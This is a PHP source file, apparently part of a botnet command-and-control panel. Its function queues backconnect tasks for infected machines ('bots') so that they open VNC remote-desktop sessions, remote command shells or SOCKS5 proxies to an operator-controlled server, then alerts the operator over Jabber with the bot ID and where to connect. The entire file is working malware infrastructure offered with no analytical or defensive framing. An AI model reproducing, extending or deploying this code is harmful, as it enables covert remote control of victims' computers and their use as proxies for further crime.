<?php
define('VNC_RECONNECT_THRESHOLD', 60*10);

/** Bot backconnect.
 * @param string	$botid	The bot ID to backconnect to (when have such a task)
 */
function vncplugin_autoconnect($botid){
	if (empty($GLOBALS['config']['vnc_server']))
		return;
	
	# Check whether we have some connection tasks
	$q_time_threshold = time() - VNC_RECONNECT_THRESHOLD; # don't reconnect too fast
	$q_botId = mysql_real_escape_string($botid);
	$R = mysql_query("SELECT * FROM `vnc_bot_connections` WHERE `bot_id`='$q_botId' AND `do_connect`<>0 AND (`ctime`<=$q_time_threshold OR `do_connect` IN (-2,2) );");
	if (!$R || mysql_num_rows($R)==0)
		return;
	$connect = mysql_fetch_assoc($R);
	GateLog::get()->log(GateLog::L_TRACE, 'plugin.vnc', "Connecting to the bot. Protocol={$connect['protocol']}, do={$connect['do_connect']}");
	
	# Generate the IP:PORT pairs
	if (empty($connect['my_port']))
		$connect['my_port'] = rand(10000, 20000-1);
	if (empty($connect['bot_ipport']))
		$connect['bot_port'] = rand(20000, 40000);
	
	# Connect data
	$c_vnc_server = $GLOBALS['config']['vnc_server'];
	$c_botid = urlencode($botid);
	$c_my_port = $connect['my_port'];
	$c_bot_port = $connect['bot_port'];
	
	# Reserve the port pair
	$context = stream_context_create(array('http' => array('header' => 'Connection: close', 'timeout' => 10)));
	$vnc_url = "http://$c_vnc_server/test.php?p1=$c_my_port&p2=$c_bot_port&b=$c_botid";
	if (FALSE === file_get_contents($vnc_url, 0, $context))
		return trigger_error("VNC-server connection failed: $vnc_url");
	
	# Add a script
	require_once 'system/lib/shortcuts.php';
	
	$q_script_name = '?';
	$q_script = "???";
	$q_connection_name = '?';
	switch ($connect['protocol']){
		case 1:
			$q_connection_name = 'VNC';
			$q_script = "bot_bc_add vnc $c_vnc_server $c_bot_port";
			$q_script_name = 'backconnect:VNC:';
			break;
		case 2:
			$q_connection_name = 'CMD';
			$q_script = "bot_bc_add shell $c_vnc_server $c_bot_port";
			$q_script_name = 'backconnect:CMD:';
			break;
		case 5:
			$q_connection_name = 'SOCKS5';
			$q_script = "bot_bc_add socks $c_vnc_server $c_bot_port";
			$q_script_name = 'backconnect:SOCKS:';
			break;
		}
	$q_script_name .= round(microtime(true)*100);
	
	if (!add_simple_script($botid, $q_script_name, $q_script))
		return trigger_error("Error inserting $q_connection_name script: ".mysql_error(), E_USER_WARNING);
	
	# Update connection info
	GateLog::get()->log(GateLog::L_DEBUG, 'plugin.vnc', "Backconnect script '$q_script_name' added: my=$c_vnc_server:$c_my_port, bot=$c_vnc_server:$c_bot_port, script=$q_script");
	
	if ($connect['do_connect'] >=  1)	$connect['do_connect'] =  0; # one shot
	if ($connect['do_connect'] == -2)	$connect['do_connect'] = -1; # restore 'autoconnect' state
	$q_ctime = time();
	if (!mysql_query("UPDATE `vnc_bot_connections` SET `ctime`=$q_ctime, `my_port`=$c_my_port, `bot_port` = $c_bot_port, `do_connect`={$connect['do_connect']} WHERE `bot_id`='$q_botId';"))
		return trigger_error('Error updating VNC connections: '.mysql_error(), E_USER_WARNING);
	
	# Notify
	if (!empty($GLOBALS['config']['vnc_notify_jid'])){
		$R = mysql_query('SELECT `comment` FROM `botnet_list` WHERE `bot_id`="'.mysql_real_escape_string($botid).'" AND `comment`<>"";');
		if (mysql_num_rows($R)){
			$row = mysql_fetch_row($R);
			$comment = array_shift($row);
		}
		
		GateLog::get()->log(GateLog::L_TRACE, 'plugin.vnc', "Jabber notify: ".$GLOBALS['config']['vnc_notify_jid']);
		$message = sprintf(
			"New %s connection established\nBotID: %s %s\n\nConnect to: %s:%s\n",
			$q_connection_name,
			$botid, $comment? "($comment)" : '',
			$c_vnc_server, $c_my_port
			);
		jabber_notify($GLOBALS['config']['vnc_notify_jid'], $message);
		}
	}
